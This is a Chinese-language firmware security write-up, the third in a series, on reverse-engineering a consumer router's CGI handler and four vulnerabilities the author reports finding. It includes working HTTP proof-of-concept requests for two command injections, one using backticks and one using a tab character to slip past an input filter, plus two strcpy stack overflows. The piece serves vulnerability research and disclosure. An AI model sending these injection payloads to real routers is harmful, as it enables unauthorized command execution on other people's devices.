# 固件CGI分析手法（三）
> Ayaka
> 来源：https://www.iotsec-zone.com/article/198

通过前两篇文章，我们已经能够分析清楚从用户所点击的web界面的各类功能是在哪里实现的，本篇文章将选取几个笔者发现并上报的具有代表性的漏洞来走近漏洞挖掘实战。

# 漏洞一：cgi主函数命令注入漏洞

其实这部分代码在第一篇文章中分析过，不知道那个时候读者有没有发现这里存在的命令注入漏洞

![0.png](https://www.iotsec-zone.com/images/MdImg/d5ade6a47fcd9640601c9587d27b47a8.png)

这部分代码的逻辑大致为，当请求包的QUERY_STRING中有exportOvpn字样时，先用memset初始化一堆变量，然后用了一个陌生的函数getNthValueSafe，看似实在获取一些参数值，这里我们还是按照第一篇文章中的分析思想，遇到没见过的，明显是写路由器固件的人自己写的库函数时，直接去固件中搜：

![1.png](https://www.iotsec-zone.com/images/MdImg/8aee596fea08234f016e35f6526dd129.jpg)

可以看到这个函数大概率上是在libmystdlib.so中实现的了，我们去分析分析：

![2.png](https://www.iotsec-zone.com/images/MdImg/21b8d420b18051b69c1d4109760c6043.jpg)

函数实现非常的直观，并没有更深层的函数需要分析，我们对比着调用时的参数来看，调用时的参数依次为：

参数一：index
参数二：字符串
参数三：字符
参数四：一段被初始化的空间

然后回到getNthValueSafe函数本身，它先是通过strchr，在第二个参数中寻找第三个参数，并且寻找的是第index个，然后指针++，即将这个字符后面的一段字符串存到参数4处

将其放到实际应用场景中，其实很好理解

![3.png](https://www.iotsec-zone.com/images/MdImg/6b2ecab70ea8dc05b4fbc683cdc15e5e.jpg)

v5是QUERY_STRING，第三个参数是&，它做了一个从请求参数中解析出每个参数的作用，而根据后面的strcmp函数能够分析出来，第一个&后面应该是type=user，所以我们可以构造出一部分poc

/cgi-bin/cstecgi.cgi?exportOvpn=1&type=user

继续往下分析，第二个&后面跟的字符串存到了v50，而后再次调用getNthValueSafe，此时的第二个参数是v50，也就是第二个&后面跟的字符串，然后匹配字符是=，所以这里其实就是将v50中等于号后面的字符串放到了v52中

然后想要进入红框里的逻辑还有需要第三个&后面的字符串为filetype=gz，这样就可以走到snprintf+system的逻辑处，这里的snprintf直接将v52通过%s写入到v56中，随后不经过任何检查直接调用了system(v56)，所以只需要让v52中含有类似` 或者$，&，|等类似的符号就可以实现命令注入了

根据上面的分析，我们写出poc

```
POST /cgi-bin/cstecgi.cgi?exportOvpn=1&type=user&user=`ls>/tmp/1.txt`&filetype=gz HTTP/1.1
Host: 192.168.0.1
Content-Length: 60
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/basic/parental.html?time=1659767109312
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: uid=XNv1ntlL5i; SESSION_ID=2:1592019966:2
Connection: close
```

然后我们实战一下：

![4.png](https://www.iotsec-zone.com/images/MdImg/1017ee41f13013b9ce07f82bde6fe3e8.jpg)

这里是通过telnet连进的路由器，然后在tmp目录中本来是没有1.txt这个文件的，当我们将poc发送给路由器后，tmp目录下多了一个1.txt，其内容则是ls的结果，证明命令注入成功实现

这个洞笔者独立发现并上报之后，发现已经有人报过了hhhhhh，不过倒也不差这一个编号

# 漏洞二：setDiagnosisCfg命令注入漏洞

首先来看看setDiagnosisCfg实现了一个什么功能：
![5.png](https://www.iotsec-zone.com/images/MdImg/83c847de9ba2f178d3267c59cf974bab.jpg)

（这里由于本人的720R昨天晚上被我搞坏了。。所以先用T8凑活一下，好在T8也有这个页面）

可以看出来，其功能是用户提供一个地址，然后程序会执行ping命令来并抓取结果显示到下面的框中

然后我们看看cgi中这个函数时如何实现的
![6.png](https://www.iotsec-zone.com/images/MdImg/6cdf4969ff21c60815386a826df1c29d.png)

非常短小精悍，首先获取ip和num对应就value，然后执行一个check函数，检查一下ip是否合法，通过检查之后通过sprintf组合出一个字符串，然后扔进system里，现在看来，唯一要做的事情就是绕过这个Validity_check，之前已经说过遇到这种固件作者自己写的库函数应该如何找到其具体实现：
![7.png](https://www.iotsec-zone.com/images/MdImg/603e4d336a3a56236fbead59e56cf824.png)

![8.png](https://www.iotsec-zone.com/images/MdImg/dfe82df0702503793d93e96a5b520929.png)

check函数检查了给定字符串中是否含有上图这些特殊符号或者字符串，这些命令规避了大部分命令注入，但是我们发现，它检查了是否有\n，却没有检查它的孪生兄弟\t，那么这是否意味着我们可以借此绕过这个检查呢，一试便知

写出poc发送给路由器

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
Content-Length: 52
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/advance/diagnosis.html?time=1659889464870
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: SESSION_ID=2:1591951611:2
Connection: close

{
"ip":"aaaa\tls>/tmp/1.txt",
"num":"2",
"topicurl":"setDiagnosisCfg"
}
```

![9.png](https://www.iotsec-zone.com/images/MdImg/efda9b80b69366fdc967f416f3e3e5ad.png)

可以发现，tmp下面本来没有1.txt,发过我们写的poc之后出现了1.txt,可见我们之前的绕过是成功的，这个洞并没有跟之前的人重复，还算幸运。

# 漏洞三 setParentalRules函数存在栈溢出

看过两个命令注入，再来看一个栈溢出漏洞

其功能为路由器中的家长控制功能：
![10.png](https://www.iotsec-zone.com/images/MdImg/8fa440dd6cd81118758e414eb3ae4e8a.png)

当我们增添数据的时候，有一个description字段用户完全可控，cgi在实现其功能的时候调用了strcpy函数转存字符串，但是并没有对长度做出任何检测：

![11.png](https://www.iotsec-zone.com/images/MdImg/6a7057ad7db2a1e8796e2e8cf9a062ee.png)

![12.png](https://www.iotsec-zone.com/images/MdImg/afd7645314133a9243301253344fb258.png)

这就导致了栈溢出的发生，这里只用长度很长的字符串来验证，不进行栈溢出的后续利用：
![13.png](https://www.iotsec-zone.com/images/MdImg/d33565d004efea762b5430af6e6c4729.png)

poc包发送之后，现象大致就是家长控制按钮失灵，功能无法启动
![14.png](https://www.iotsec-zone.com/images/MdImg/c71a46d05020019020af1fa47fc2f429.png)

# 漏洞四：setUrlFilterRules函数存在栈溢出
从名字也能够看出，这应该是一个用于设置url过滤功能的函数，并且这个url是由用户来指定的
![15.png](https://www.iotsec-zone.com/images/MdImg/20896c0e5e1a8c0206a9fa2e0e0e8894.png)

但是程序在具体实现的时候，用strcpy复制了来自用户输入的字符串，并且没有对长度做任何检查，而且还是复制到了栈上，这就导致了栈溢出的发生。这个漏洞和上个漏洞比较相似，就不再放效果图

上面四个漏洞是我选取的这款路由器中比较典型的几个漏洞，其余还有很多，不过大同小异。

从上面这四个漏洞可以看出，路由器的脆弱点一般在于用户输入，有一种专门跟踪用户输入来寻找程序脆弱点的手段叫污点分析，很多情况下漏洞的产生其实就在于没有对用户的输入进行严格的检测或者判断，从而触发漏洞。所以在分析固件的时候，一个是去寻找敏感函数，如system，execve或者popen等容易触发命令注入的地方，还有就是关注strcpy，memcpy等容易因长度检测不严格导致的栈溢出，如果从用户操作角度来寻找漏洞，则是在路由器web界面中寻找哪里是用户可以进行任意输入的地方，从这些地方出发会更加容易的找到路由器的漏洞。
